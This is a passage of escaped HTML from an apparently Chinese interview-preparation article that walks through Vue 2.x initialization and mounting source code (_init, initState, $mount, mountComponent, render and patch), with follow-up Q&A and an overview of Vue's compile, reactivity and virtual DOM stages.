istanbul ignore else */\\n  if (process.env.NODE_ENV !== &#39;production&#39;) {\\n    initProxy(vm)\\n  } else {\\n    vm._renderProxy = vm\\n  }\\n  // expose real self\\n  vm._self = vm\\n  initLifecycle(vm)\\n  initEvents(vm)\\n  initRender(vm)\\n  callHook(vm, &#39;beforeCreate&#39;)\\n  initInjections(vm) // resolve injections before data/props\\n  initState(vm)\\n  initProvide(vm) // resolve provide after data/props\\n  callHook(vm, &#39;created&#39;)\\n\\n  /* istanbul ignore if */\\n  if (process.env.NODE_ENV !== &#39;production&#39; &amp;&amp; config.performance &amp;&amp; mark) {\\n    vm._name = formatComponentName(vm, false)\\n    mark(endTag)\\n    measure(`vue ${vm._name} init`, startTag, endTag)\\n  }\\n\\n  if (vm.$options.el) {\\n    vm.$mount(vm.$options.el)\\n  }\\n}\\n</code></pre>\\n<blockquote>\\n<p><code>Vue</code> 初始化主要就干了几件事情，<code>合并配置</code>，<code>初始化生命周期</code>，<code>初始化事件中心</code>，<code>初始化渲染</code>，<code>初始化 data</code>、<code>props</code>、<code>computed</code>、<code>watcher</code> 等</p>\\n</blockquote>\\n<h3 id=\\"vue2-x详细\\"><a class=\\"header-anchor\\" href=\\"#vue2-x详细\\">#</a> vue2.x详细</h3>\\n<p><strong>1. 分析</strong></p>\\n<p>首先找到<code>vue</code>的构造函数</p>\\n<p>源码位置：src\\\\core\\\\instance\\\\index.js</p>\\n<pre class=\\"language-js\\"><code>function Vue (options) {\\n  if (process.env.NODE_ENV !== &#39;production&#39; &amp;&amp;\\n    !(this instanceof Vue)\\n  ) {\\n    warn(&#39;Vue is a constructor and should be called with the `new` keyword&#39;)\\n  }\\n  this._init(options)\\n}\\n</code></pre>\\n<p><code>options</code>是用户传递过来的配置项，如<code>data、methods</code>等常用的方法</p>\\n<p><code>vue</code>构建函数调用<code>_init</code>方法，但我们发现本文件中并没有此方法，但仔细可以看到文件下方定定义了很多初始化方法</p>\\n<pre class=\\"language-js\\"><code>initMixin(Vue);     // 定义 _init\\nstateMixin(Vue);    // 定义 $set $get $delete $watch 等\\neventsMixin(Vue);   // 定义事件  $on  $once $off $emit\\nlifecycleMixin(Vue);// 定义 _update  $forceUpdate  $destroy\\nrenderMixin(Vue);   // 定义 _render 返回虚拟dom\\n</code></pre>\\n<p>首先可以看<code>initMixin</code>方法，发现该方法在<code>Vue</code>原型上定义了<code>_init</code>方法</p>\\n<p>源码位置：src\\\\core\\\\instance\\\\init.js</p>\\n<pre class=\\"language-js\\"><code>Vue.prototype._init = function (options?: Object) {\\n    const vm: Component = this\\n    // a uid\\n    vm._uid = uid++\\n    let startTag, endTag\\n    /* istanbul ignore if */\\n    if (process.env.NODE_ENV !== &#39;production&#39; &amp;&amp; config.performance &amp;&amp; mark) {\\n      startTag = `vue-perf-start:${vm._uid}`\\n      endTag = `vue-perf-end:${vm._uid}`\\n      mark(startTag)\\n    }\\n\\n    // a flag to avoid this being observed\\n    vm._isVue = true\\n    // merge options\\n    // 合并属性，判断初始化的是否是组件，这里合并主要是 mixins 或 extends 的方法\\n    if (options &amp;&amp; options._isComponent) {\\n      // optimize internal component instantiation\\n      // since dynamic options merging is pretty slow, and none of the\\n      // internal component options needs special treatment.\\n      initInternalComponent(vm, options)\\n    } else { // 合并vue属性\\n      vm.$options = mergeOptions(\\n        resolveConstructorOptions(vm.constructor),\\n        options || {},\\n        vm\\n      )\\n    }\\n    /* istanbul ignore else */\\n    if (process.env.NODE_ENV !== &#39;production&#39;) {\\n      // 初始化proxy拦截器\\n      initProxy(vm)\\n    } else {\\n      vm._renderProxy = vm\\n    }\\n    // expose real self\\n    vm._self = vm\\n    // 初始化组件生命周期标志位\\n    initLifecycle(vm)\\n    // 初始化组件事件侦听\\n    initEvents(vm)\\n    // 初始化渲染方法\\n    initRender(vm)\\n    callHook(vm, &#39;beforeCreate&#39;)\\n    // 初始化依赖注入内容，在初始化data、props之前\\n    initInjections(vm) // resolve injections before data/props\\n    // 初始化props/data/method/watch/methods\\n    initState(vm)\\n    initProvide(vm) // resolve provide after data/props\\n    callHook(vm, &#39;created&#39;)\\n\\n    /* istanbul ignore if */\\n    if (process.env.NODE_ENV !== &#39;production&#39; &amp;&amp; config.performance &amp;&amp; mark) {\\n      vm._name = formatComponentName(vm, false)\\n      mark(endTag)\\n      measure(`vue ${vm._name} init`, startTag, endTag)\\n    }\\n    // 挂载元素\\n    if (vm.$options.el) {\\n      vm.$mount(vm.$options.el)\\n    }\\n  }\\n</code></pre>\\n<p>仔细阅读上面的代码，我们得到以下结论：</p>\\n<ul>\\n<li>在调用<code>beforeCreate</code>之前，数据初始化并未完成，像<code>data</code>、<code>props</code>这些属性无法访问到</li>\\n<li>到了<code>created</code>的时候，数据已经初始化完成，能够访问<code>data</code>、<code>props</code>这些属性，但这时候并未完成<code>dom</code>的挂载，因此无法访问到<code>dom</code>元素</li>\\n<li>挂载方法是调用<code>vm.$mount</code>方法</li>\\n</ul>\\n<p><code>initState</code>方法是完成<code>props/data/method/watch/methods</code>的初始化</p>\\n<p>源码位置：src\\\\core\\\\instance\\\\state.js</p>\\n<pre class=\\"language-js\\"><code>export function initState (vm: Component) {\\n  // 初始化组件的watcher列表\\n  vm._watchers = []\\n  const opts = vm.$options\\n  // 初始化props\\n  if (opts.props) initProps(vm, opts.props)\\n  // 初始化methods方法\\n  if (opts.methods) initMethods(vm, opts.methods)\\n  if (opts.data) {\\n    // 初始化data  \\n    initData(vm)\\n  } else {\\n    observe(vm._data = {}, true /* asRootData */)\\n  }\\n  if (opts.computed) initComputed(vm, opts.computed)\\n  if (opts.watch &amp;&amp; opts.watch !== nativeWatch) {\\n    initWatch(vm, opts.watch)\\n  }\\n}\\n</code></pre>\\n<p>我们和这里主要看初始化<code>data</code>的方法为<code>initData</code>，它与<code>initState</code>在同一文件上</p>\\n<pre class=\\"language-js\\"><code>function initData (vm: Component) {\\n  let data = vm.$options.data\\n  // 获取到组件上的data\\n  data = vm._data = typeof data === &#39;function&#39;\\n    ? getData(data, vm)\\n    : data || {}\\n  if (!isPlainObject(data)) {\\n    data = {}\\n    process.env.NODE_ENV !== &#39;production&#39; &amp;&amp; warn(\\n      &#39;data functions should return an object:\\\\n&#39; +\\n      &#39;https://vuejs.org/v2/guide/components.html#data-Must-Be-a-Function&#39;,\\n      vm\\n    )\\n  }\\n  // proxy data on instance\\n  const keys = Object.keys(data)\\n  const props = vm.$options.props\\n  const methods = vm.$options.methods\\n  let i = keys.length\\n  while (i--) {\\n    const key = keys[i]\\n    if (process.env.NODE_ENV !== &#39;production&#39;) {\\n      // 属性名不能与方法名重复\\n      if (methods &amp;&amp; hasOwn(methods, key)) {\\n        warn(\\n          `Method &quot;${key}&quot; has already been defined as a data property.`,\\n          vm\\n        )\\n      }\\n    }\\n    // 属性名不能与state名称重复\\n    if (props &amp;&amp; hasOwn(props, key)) {\\n      process.env.NODE_ENV !== &#39;production&#39; &amp;&amp; warn(\\n        `The data property &quot;${key}&quot; is already declared as a prop. ` +\\n        `Use prop default value instead.`,\\n        vm\\n      )\\n    } else if (!isReserved(key)) { // 验证key值的合法性\\n      // 将_data中的数据挂载到组件vm上,这样就可以通过this.xxx访问到组件上的数据\\n      proxy(vm, `_data`, key)\\n    }\\n  }\\n  // observe data\\n  // 响应式监听data是数据的变化\\n  observe(data, true /* asRootData */)\\n}\\n</code></pre>\\n<p>仔细阅读上面的代码，我们可以得到以下结论：</p>\\n<ul>\\n<li>初始化顺序：<code>props</code>、<code>methods</code>、<code>data</code></li>\\n<li><code>data</code>定义的时候可选择函数形式或者对象形式（组件只能为函数形式）</li>\\n</ul>\\n<p>关于数据响应式在这就不展开详细说明</p>\\n<p>上文提到挂载方法是调用<code>vm.$mount</code>方法</p>\\n<p>源码位置：</p>\\n<pre class=\\"language-js\\"><code>Vue.prototype.$mount = function (\\n  el?: string | Element,\\n  hydrating?: boolean\\n): Component {\\n  // 获取或查询元素\\n  el = el &amp;&amp; query(el)\\n\\n  /* istanbul ignore if */\\n  // vue 不允许直接挂载到body或页面文档上\\n  if (el === document.body || el === document.documentElement) {\\n    process.env.NODE_ENV !== &#39;production&#39; &amp;&amp; warn(\\n      `Do not mount Vue to &lt;html&gt; or &lt;body&gt; - mount to normal elements instead.`\\n    )\\n    return this\\n  }\\n\\n  const options = this.$options\\n  // resolve template/el and convert to render function\\n  if (!options.render) {\\n    let template = options.template\\n    // 存在template模板，解析vue模板文件\\n    if (template) {\\n      if (typeof template === &#39;string&#39;) {\\n        if (template.charAt(0) === &#39;#&#39;) {\\n          template = idToTemplate(template)\\n          /* istanbul ignore if */\\n          if (process.env.NODE_ENV !== &#39;production&#39; &amp;&amp; !template) {\\n            warn(\\n              `Template element not found or is empty: ${options.template}`,\\n              this\\n            )\\n          }\\n        }\\n      } else if (template.nodeType) {\\n        template = template.innerHTML\\n      } else {\\n        if (process.env.NODE_ENV !== &#39;production&#39;) {\\n          warn(&#39;invalid template option:&#39; + template, this)\\n        }\\n        return this\\n      }\\n    } else if (el) {\\n      // 通过选择器获取元素内容\\n      template = getOuterHTML(el)\\n    }\\n    if (template) {\\n      /* istanbul ignore if */\\n      if (process.env.NODE_ENV !== &#39;production&#39; &amp;&amp; config.performance &amp;&amp; mark) {\\n        mark(&#39;compile&#39;)\\n      }\\n      /**\\n       *  1.将temmplate解析ast tree\\n       *  2.将ast tree转换成render语法字符串\\n       *  3.生成render方法\\n       */\\n      const { render, staticRenderFns } = compileToFunctions(template, {\\n        outputSourceRange: process.env.NODE_ENV !== &#39;production&#39;,\\n        shouldDecodeNewlines,\\n        shouldDecodeNewlinesForHref,\\n        delimiters: options.delimiters,\\n        comments: options.comments\\n      }, this)\\n      options.render = render\\n      options.staticRenderFns = staticRenderFns\\n\\n      /* istanbul ignore if */\\n      if (process.env.NODE_ENV !== &#39;production&#39; &amp;&amp; config.performance &amp;&amp; mark) {\\n        mark(&#39;compile end&#39;)\\n        measure(`vue ${this._name} compile`, &#39;compile&#39;, &#39;compile end&#39;)\\n      }\\n    }\\n  }\\n  return mount.call(this, el, hydrating)\\n}\\n</code></pre>\\n<p>阅读上面代码，我们能得到以下结论：</p>\\n<ul>\\n<li>不要将根元素放到<code>body</code>或者<code>html</code>上</li>\\n<li>可以在对象中定义<code>template/render</code>或者直接使用<code>template</code>、<code>el</code>表示元素选择器</li>\\n<li>最终都会解析成<code>render</code>函数，调用<code>compileToFunctions</code>，会将<code>template</code>解析成<code>render</code>函数</li>\\n</ul>\\n<p>对<code>template</code>的解析步骤大致分为以下几步：</p>\\n<ul>\\n<li>将<code>html</code>文档片段解析成<code>ast</code>描述符</li>\\n<li>将<code>ast</code>描述符解析成字符串</li>\\n<li>生成<code>render</code>函数</li>\\n</ul>\\n<p>生成<code>render</code>函数，挂载到<code>vm</code>上后，会再次调用<code>mount</code>方法</p>\\n<p>源码位置：src\\\\platforms\\\\web\\\\runtime\\\\index.js</p>\\n<pre class=\\"language-js\\"><code>// public mount method\\nVue.prototype.$mount = function (\\n  el?: string | Element,\\n  hydrating?: boolean\\n): Component {\\n  el = el &amp;&amp; inBrowser ? query(el) : undefined\\n  // 渲染组件\\n  return mountComponent(this, el, hydrating)\\n}\\n</code></pre>\\n<p>调用<code>mountComponent</code>渲染组件</p>\\n<pre class=\\"language-js\\"><code>export function mountComponent (\\n  vm: Component,\\n  el: ?Element,\\n  hydrating?: boolean\\n): Component {\\n  vm.$el = el\\n  // 如果没有获取解析的render函数，则会抛出警告\\n  // render是解析模板文件生成的\\n  if (!vm.$options.render) {\\n    vm.$options.render = createEmptyVNode\\n    if (process.env.NODE_ENV !== &#39;production&#39;) {\\n      /* istanbul ignore if */\\n      if ((vm.$options.template &amp;&amp; vm.$options.template.charAt(0) !== &#39;#&#39;) ||\\n        vm.$options.el || el) {\\n        warn(\\n          &#39;You are using the runtime-only build of Vue where the template &#39; +\\n          &#39;compiler is not available. Either pre-compile the templates into &#39; +\\n          &#39;render functions, or use the compiler-included build.&#39;,\\n          vm\\n        )\\n      } else {\\n        // 没有获取到vue的模板文件\\n        warn(\\n          &#39;Failed to mount component: template or render function not defined.&#39;,\\n          vm\\n        )\\n      }\\n    }\\n  }\\n  // 执行beforeMount钩子\\n  callHook(vm, &#39;beforeMount&#39;)\\n\\n  let updateComponent\\n  /* istanbul ignore if */\\n  if (process.env.NODE_ENV !== &#39;production&#39; &amp;&amp; config.performance &amp;&amp; mark) {\\n    updateComponent = () =&gt; {\\n      const name = vm._name\\n      const id = vm._uid\\n      const startTag = `vue-perf-start:${id}`\\n      const endTag = `vue-perf-end:${id}`\\n\\n      mark(startTag)\\n      const vnode = vm._render()\\n      mark(endTag)\\n      measure(`vue ${name} render`, startTag, endTag)\\n\\n      mark(startTag)\\n      vm._update(vnode, hydrating)\\n      mark(endTag)\\n      measure(`vue ${name} patch`, startTag, endTag)\\n    }\\n  } else {\\n    // 定义更新函数\\n    updateComponent = () =&gt; {\\n      // 实际调⽤是在lifeCycleMixin中定义的_update和renderMixin中定义的_render\\n      vm._update(vm._render(), hydrating)\\n    }\\n  }\\n  // we set this to vm._watcher inside the watcher&#39;s constructor\\n  // since the watcher&#39;s initial patch may call $forceUpdate (e.g. inside child\\n  // component&#39;s mounted hook), which relies on vm._watcher being already defined\\n  // 监听当前组件状态，当有数据变化时，更新组件\\n  new Watcher(vm, updateComponent, noop, {\\n    before () {\\n      if (vm._isMounted &amp;&amp; !vm._isDestroyed) {\\n        // 数据更新引发的组件更新\\n        callHook(vm, &#39;beforeUpdate&#39;)\\n      }\\n    }\\n  }, true /* isRenderWatcher */)\\n  hydrating = false\\n\\n  // manually mounted instance, call mounted on self\\n  // mounted is called for render-created child components in its inserted hook\\n  if (vm.$vnode == null) {\\n    vm._isMounted = true\\n    callHook(vm, &#39;mounted&#39;)\\n  }\\n  return vm\\n}\\n</code></pre>\\n<p>阅读上面代码，我们得到以下结论：</p>\\n<ul>\\n<li>会触发<code>boforeCreate</code>钩子</li>\\n<li>定义<code>updateComponent</code>渲染页面视图的方法</li>\\n<li>监听组件数据，一旦发生变化，触发<code>beforeUpdate</code>生命钩子</li>\\n</ul>\\n<p><code>updateComponent</code>方法主要执行在<code>vue</code>初始化时声明的<code>render</code>，<code>update</code>方法</p>\\n<p>render<code>的作用主要是生成</code>vnode</p>\\n<p>源码位置：src\\\\core\\\\instance\\\\render.js</p>\\n<pre class=\\"language-js\\"><code>// 定义vue 原型上的render方法\\nVue.prototype._render = function (): VNode {\\n    const vm: Component = this\\n    // render函数来自于组件的option\\n    const { render, _parentVnode } = vm.$options\\n\\n    if (_parentVnode) {\\n        vm.$scopedSlots = normalizeScopedSlots(\\n            _parentVnode.data.scopedSlots,\\n            vm.$slots,\\n            vm.$scopedSlots\\n        )\\n    }\\n\\n    // set parent vnode. this allows render functions to have access\\n    // to the data on the placeholder node.\\n    vm.$vnode = _parentVnode\\n    // render self\\n    let vnode\\n    try {\\n        // There&#39;s no need to maintain a stack because all render fns are called\\n        // separately from one another. Nested component&#39;s render fns are called\\n        // when parent component is patched.\\n        currentRenderingInstance = vm\\n        // 调用render方法，自己的独特的render方法， 传入createElement参数，生成vNode\\n        vnode = render.call(vm._renderProxy, vm.$createElement)\\n    } catch (e) {\\n        handleError(e, vm, `render`)\\n        // return error render result,\\n        // or previous vnode to prevent render error causing blank component\\n        /* istanbul ignore else */\\n        if (process.env.NODE_ENV !== &#39;production&#39; &amp;&amp; vm.$options.renderError) {\\n            try {\\n                vnode = vm.$options.renderError.call(vm._renderProxy, vm.$createElement, e)\\n            } catch (e) {\\n                handleError(e, vm, `renderError`)\\n                vnode = vm._vnode\\n            }\\n        } else {\\n            vnode = vm._vnode\\n        }\\n    } finally {\\n        currentRenderingInstance = null\\n    }\\n    // if the returned array contains only a single node, allow it\\n    if (Array.isArray(vnode) &amp;&amp; vnode.length === 1) {\\n        vnode = vnode[0]\\n    }\\n    // return empty vnode in case the render function errored out\\n    if (!(vnode instanceof VNode)) {\\n        if (process.env.NODE_ENV !== &#39;production&#39; &amp;&amp; Array.isArray(vnode)) {\\n            warn(\\n                &#39;Multiple root nodes returned from render function. Render function &#39; +\\n                &#39;should return a single root node.&#39;,\\n                vm\\n            )\\n        }\\n        vnode = createEmptyVNode()\\n    }\\n    // set parent\\n    vnode.parent = _parentVnode\\n    return vnode\\n}\\n</code></pre>\\n<p><code>_update</code>主要功能是调用<code>patch</code>，将<code>vnode</code>转换为真实<code>DOM</code>，并且更新到页面中</p>\\n<p>源码位置：src\\\\core\\\\instance\\\\lifecycle.js</p>\\n<pre class=\\"language-js\\"><code>Vue.prototype._update = function (vnode: VNode, hydrating?: boolean) {\\n    const vm: Component = this\\n    const prevEl = vm.$el\\n    const prevVnode = vm._vnode\\n    // 设置当前激活的作用域\\n    const restoreActiveInstance = setActiveInstance(vm)\\n    vm._vnode = vnode\\n    // Vue.prototype.__patch__ is injected in entry points\\n    // based on the rendering backend used.\\n    if (!prevVnode) {\\n      // initial render\\n      // 执行具体的挂载逻辑\\n      vm.$el = vm.__patch__(vm.$el, vnode, hydrating, false /* removeOnly */)\\n    } else {\\n      // updates\\n      vm.$el = vm.__patch__(prevVnode, vnode)\\n    }\\n    restoreActiveInstance()\\n    // update __vue__ reference\\n    if (prevEl) {\\n      prevEl.__vue__ = null\\n    }\\n    if (vm.$el) {\\n      vm.$el.__vue__ = vm\\n    }\\n    // if parent is an HOC, update its $el as well\\n    if (vm.$vnode &amp;&amp; vm.$parent &amp;&amp; vm.$vnode === vm.$parent._vnode) {\\n      vm.$parent.$el = vm.$el\\n    }\\n    // updated hook is called by the scheduler to ensure that children are\\n    // updated in a parent&#39;s updated hook.\\n  }\\n</code></pre>\\n<p><strong>2. 结论</strong></p>\\n<ul>\\n<li><code>new Vue</code>的时候调用会调用<code>_init</code>方法\\n<ul>\\n<li>定义 <code>$set</code>、<code>$get</code> 、<code>$delete</code>、<code>$watch</code> 等方法</li>\\n<li>定义 <code>$on</code>、<code>$off</code>、<code>$emit</code>、<code>$off</code>等事件</li>\\n<li>定义 <code>_update</code>、<code>$forceUpdate</code>、<code>$destroy</code>生命周期</li>\\n</ul>\\n</li>\\n<li>调用<code>$mount</code>进行页面的挂载</li>\\n<li>挂载的时候主要是通过<code>mountComponent</code>方法</li>\\n<li>定义<code>updateComponent</code>更新函数</li>\\n<li>执行<code>render</code>生成虚拟<code>DOM</code></li>\\n<li><code>_update</code>将虚拟<code>DOM</code>生成真实<code>DOM</code>结构，并且渲染到页面中</li>\\n</ul>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>组件在 <code>beforeCreate</code> 中读取 <code>this.userId</code> 得到 <code>undefined</code>，挪到 <code>created</code> 就正常；同事怀疑接口时序，你会怎样根据初始化流程判断？</strong></p>\\n<p>这更符合生命周期时序，而不是接口竞态：<code>beforeCreate</code> 发生在 <code>initState</code> 之前，此时 <code>props</code>、<code>methods</code>、<code>data</code>、<code>computed</code> 和 <code>watch</code> 尚未完成初始化。<code>created</code> 已经过状态初始化，可以访问这些成员，但还没有完成 <code>DOM</code> 挂载，因此不能依赖 <code>$el</code> 或页面节点。</p>\\n</li>\\n<li>\\n<p><strong>一个组件的 <code>props</code>、<code>methods</code>、<code>data</code> 都声明了 <code>submit</code>，运行时出现覆盖警告；你会如何解释初始化顺序并整改？</strong></p>\\n<p><code>initState</code> 按 <code>props</code>、<code>methods</code>、<code>data</code>、<code>computed</code>、<code>watch</code> 的路径初始化，<code>initData</code> 还会检查数据键是否与方法或 <code>props</code> 重名。应让各类成员使用明确且不冲突的名称，而不是依赖后初始化项覆盖前项；组件的 <code>data</code> 还应使用返回对象的函数，避免实例共享状态。</p>\\n</li>\\n<li>\\n<p><strong>低代码平台从服务端下发 <code>template</code> 字符串，而常规业务使用预编译的单文件组件；两类页面该如何选择 <code>Vue</code> 的运行时版本？</strong></p>\\n<p>常规单文件组件应在构建期把模板编译为 <code>render</code> 函数，线上可使用不含编译器的运行时版本。低代码页面若确实需要浏览器内把 <code>template</code> 转为 <code>render</code>，必须使用包含编译器的构建；这会增加运行时编译成本，而且不可信模板具有执行风险，需严格限制来源与能力。</p>\\n</li>\\n<li>\\n<p><strong>线上报错提示使用了 <code>runtime-only build</code>，组件只有 <code>template</code> 没有 <code>render</code>，挂载后显示空内容；你会如何定位构建链路？</strong></p>\\n<p>该构建不包含模板编译器，<code>$mount</code> 无法把运行时 <code>template</code> 转成 <code>render</code>，最终只能产生空节点并给出警告。应检查 <code>.vue</code> 文件是否经过正确的构建插件预编译，或确认是否误用了运行时模板字符串；只有确需运行时编译时才切换到包含编译器的版本。</p>\\n</li>\\n<li>\\n<p><strong>性能分析显示组件状态已经初始化，但首次页面仍未出现；你需要把 <code>_init</code>、<code>$mount</code>、<code>render</code> 和 <code>patch</code> 串起来排查，关键链路是什么？</strong></p>\\n<p><code>_init</code> 完成选项合并、生命周期与状态初始化后，存在 <code>el</code> 才会进入 <code>$mount</code>；没有 <code>render</code> 时，完整版会先把 <code>template</code> 编译成它。<code>mountComponent</code> 创建渲染 <code>Watcher</code>，由 <code>vm._render()</code> 生成 <code>VNode</code>，再由 <code>vm._update()</code> 完成 <code>patch</code>；应沿这条链检查挂载元素、编译产物和渲染异常。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_8-理解vue运行机制全局概览\\"><a class=\\"header-anchor\\" href=\\"#_8-理解vue运行机制全局概览\\">#</a> 8 理解Vue运行机制全局概览</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>五个阶段：<strong>初始化 → 编译 → 响应式绑定 → 渲染 → 更新</strong></li>\\n<li>初始化：<code>_init</code> 处理 <code>props</code>/<code>data</code>/<code>computed</code>/<code>watch</code>，把数据变成响应式</li>\\n<li>编译：<code>template</code> → <code>AST</code> → 优化（标记静态节点）→ 生成 <code>render</code> 函数字符串</li>\\n<li>渲染：渲染 <code>Watcher</code> 执行 <code>render</code> 生成 <code>VNode</code>，<code>patch</code> 把 <code>VNode</code> 变成真实 <code>DOM</code>，同时完成依赖收集</li>\\n<li>更新：数据变 → <code>setter</code> → <code>dep.notify</code> → <code>Watcher</code> 入队去重 → <code>nextTick</code> 微任务里批量 <code>flush</code> → 重新 <code>render</code> + <code>patch</code>（diff）</li>\\n</ul>\\n<p><strong><code>Vue</code> 的运行主线是：初始化响应式数据，收集渲染依赖，数据变化后通知 <code>Watcher</code>，再异步更新视图。</strong> 挂载时，模板会经过 <code>parse</code>、<code>optimize</code>、<code>generate</code> 生成 <code>render function</code>，执行后得到 <code>VNode</code>。渲染读取数据会触发 <code>getter</code>，把 <code>Watcher</code> 收集到 <code>Dep</code>；赋值则触发 <code>setter</code> 通知更新。更新时新旧 <code>VNode</code> 经过 <code>patch</code> 和 <code>diff</code>，最终只修改有差异的真实 <code>DOM</code>。</p>\\n</section>\\n<h3 id=\\"全局概览\\"><a class=\\"header-anchor\\" href=\\"#全局概览\\">#</a> 全局概览</h3>\\n<p>首先我们来看一下笔者画的内部流程图。</p>\\n<p><img src=\\"https://s.poetries.top/gitee/2020/07/vue/1.png\\" alt=\\"\\"></p>\\n<p>大家第一次看到这个图一定是一头雾水的，没有关系，我们来逐个讲一下这些模块的作用以及调用关系。相信讲完之后大家对<code>Vue.js</code>内部运行机制会有一个大概的认识。</p>\\n<h3 id=\\"初始化及挂载\\"><a class=\\"header-anchor\\" href=\\"#初始化及挂载\\">#</a> 初始化及挂载</h3>\\n<p><img src=\\"https://s.poetries.top/gitee/2020/07/vue/2.png\\" alt=\\"\\"></p>\\n<blockquote>\\n<p>在 <code>new Vue()</code> 之后。 Vue 会调用 <code>_init</code> 函数进行初始化，也就是这里的 <code>init</code> 过程，它会初始化生命周期、事件、 props、 methods、 data、 computed 与 watch 等。其中最重要的是通过 <code>Object.defineProperty</code> 设置 <code>setter</code> 与 <code>getter</code> 函数，用来实现「<strong>响应式</strong>」以及「<strong>依赖收集</strong>」，后面会详细讲到，这里只要有一个印象即可。</p>\\n</blockquote>\\n<blockquote>\\n<p>初始化之后调用 <code>$mount</code> 会挂载组件，如果是运行时编译，即不存在 render function 但是存在 template 的情况，需要进行「<strong>编译</strong>」步骤。</p>\\n</blockquote>\\n<h3 id=\\"编译\\"><a class=\\"header-anchor\\" href=\\"#编译\\">#</a> 编译</h3>\\n<p><code>compile</code>编译可以分成 <code>parse</code>、<code>optimize</code> 与 <code>generate</code> 三个阶段，最终需要得到 <code>render function</code>。</p>\\n<p><img src=\\"https://s.poetries.top/gitee/2020/07/vue/3.png\\" alt=\\"\\"></p>\\n<p><strong>1. parse</strong></p>\\n<p><code>parse</code> 会用正则等方式解析 <code>template</code> 模板中的指令、<code>class</code>、<code>style</code>等数据，形成<code>AST</code>。</p>\\n<p><strong>2. optimize</strong></p>\\n<blockquote>\\n<p><code>optimize</code> 的主要作用是标记 <code>static</code> 静态节点，这是 Vue 在编译过程中的一处优化，后面当 <code>update</code> 更新界面时，会有一个 <code>patch</code> 的过程， diff 算法会直接跳过静态节点，从而减少了比较的过程，优化了 <code>patch</code> 的性能。</p>\\n</blockquote>\\n<p><strong>3. generate</strong></p>\\n<blockquote>\\n<p><code>generate</code> 是将 <code>AST</code> 转化成 <code>render function</code> 字符串的过程，得到结果是 <code>render</code> 的字符串以及 <code>staticRenderFns</code> 字符串。</p>\\n</blockquote>\\n<ul>\\n<li>在经历过 <code>parse</code>、<code>optimize</code> 与 <code>generate</code> 这三个阶段以后，组件中就会存在渲染 <code>VNode</code> 所需的 <code>render function</code> 了。</li>\\n</ul>\\n<h3 id=\\"响应式\\"><a class=\\"header-anchor\\" href=\\"#响应式\\">#</a> 响应式</h3>\\n<p>接下来也就是 <code>Vue.js</code> 响应式核心部分。</p>\\n<p><img src=\\"https://s.poetries.top/gitee/2020/07/vue/4.png\\" alt=\\"\\"></p>\\n<blockquote>\\n<p>这里的 <code>getter</code> 跟 <code>setter</code> 已经在之前介绍过了，在 <code>init</code> 的时候通过 <code>Object.defineProperty</code> 进行了绑定，它使得当被设置的对象被读取的时候会执行 <code>getter</code> 函数，而在当被赋值的时候会执行 <code>setter</code> 函数。</p>\\n</blockquote>\\n<ul>\\n<li>当 <code>render function</code> 被渲染的时候，因为会读取所需对象的值，所以会触发 <code>getter</code> 函数进行「<strong>依赖收集</strong>」，「<strong>依赖收集</strong>」的目的是将观察者 <code>Watcher</code> 对象存放到当前闭包中的订阅者 <code>Dep</code> 的 <code>subs</code> 中。形成如下所示的这样一个关系。</li>\\n</ul>\\n<p><img src=\\"https://s.poetries.top/gitee/2020/07/vue/5.png\\" alt=\\"\\"></p>\\n<blockquote>\\n<p>在修改对象的值的时候，会触发对应的 <code>setter</code>， <code>setter</code> 通知之前「<strong>依赖收集</strong>」得到的 <code>Dep</code> 中的每一个 <code>Watcher</code>，告诉它们自己的值改变了，需要重新渲染视图。这时候这些 <code>Watcher</code> 就会开始调用 <code>update</code> 来更新视图，当然这中间还有一个 <code>patch</code> 的过程以及使用队列来异步更新的策略，这个我们后面再讲。</p>\\n</blockquote>\\n<h3 id=\\"virtual-dom\\"><a class=\\"header-anchor\\" href=\\"#virtual-dom\\">#</a> Virtual DOM</h3>\\n<blockquote>\\n<p>我们知道，<code>render function</code> 会被转化成 <code>VNode</code> 节点。<code>Virtual DOM</code> 其实就是一棵以 JavaScript 对象（ VNode 节点）作为基础的树，用对象属性来描述节点，实际上它只是一层对真实 DOM 的抽象。最终可以通过一系列操作使这棵树映射到真实环境上。由于 Virtual DOM 是以 JavaScript 对象为基础而不依赖真实平台环境，所以使它具有了跨平台的能力，比如说浏览器平台、Weex、Node 等。</p>\\n</blockquote>\\n<p>比如说下面这样一个例子：</p>\\n<pre class=\\"language-js\\"><code>{\\n    tag: &#39;div&#39;,                 /*说明这是一个div标签*/\\n    children: [                 /*存放该标签的子节点*/\\n        {\\n            tag: &#39;a&#39;,           /*说明这是一个a标签*/\\n            text: &#39;click me&#39;    /*标签的内容*/\\n        }\\n    ]\\n}\\n\\n</code></pre>\\n<p>渲染后可以得到</p>\\n<pre class=\\"language-text\\"><code>&lt;div&gt;\\n    &lt;a&gt;click me&lt;/a&gt;\\n&lt;/div&gt;\\n\\n</code></pre>\\n<blockquote>\\n<p>这只是一个简单的例子，实际上的节点有更多的属性来标志节点，比如 isStatic （代表是否为静态节点）、 isComment （代表是否为注释节点）等。</p>\\n</blockquote>\\n<h3 id=\\"更新视图\\"><a class=\\"header-anchor\\" href=\\"#更新视图\\">#</a> 更新视图</h3>\\n<p><img src=\\"https://s.poetries.top/gitee/2020/07/vue/6.png\\" alt=\\"\\"></p>\\n<ul>\\n<li>前面我们说到，在修改一个对象值的时候，会通过 <code>setter -&gt; Watcher -&gt; update</code> 的流程来修改对应的视图，那么最终是如何更新视图的呢？</li>\\n<li>当数据变化后，执行 <code>render function</code> 就可以得到一个新的 <code>VNode</code> 节点，我们如果想要得到新的视图，最简单粗暴的方法就是直接解析这个新的 <code>VNode</code> 节点，然后用 <code>innerHTML</code> 直接全部渲染到真实 <code>DOM</code> 中。但是其实我们只对其中的一小块内容进行了修改，这样做似乎有些「<strong>浪费</strong>」。</li>\\n<li>那么我们为什么不能只修改那些「改变了的地方」呢？这个时候就要介绍我们的「<strong><code>patch</code></strong>」了。我们会将新的 <code>VNode</code> 与旧的 <code>VNode</code> 一起传入 <code>patch</code> 进行比较，经过 <code>diff</code> 算法得出它们的「<strong>差异</strong>」。最后我们只需要将这些「<strong>差异</strong>」的对应 <code>DOM</code> 进行修改即可。</li>\\n</ul>\\n<h3 id=\\"再看全局\\"><a class=\\"header-anchor\\" 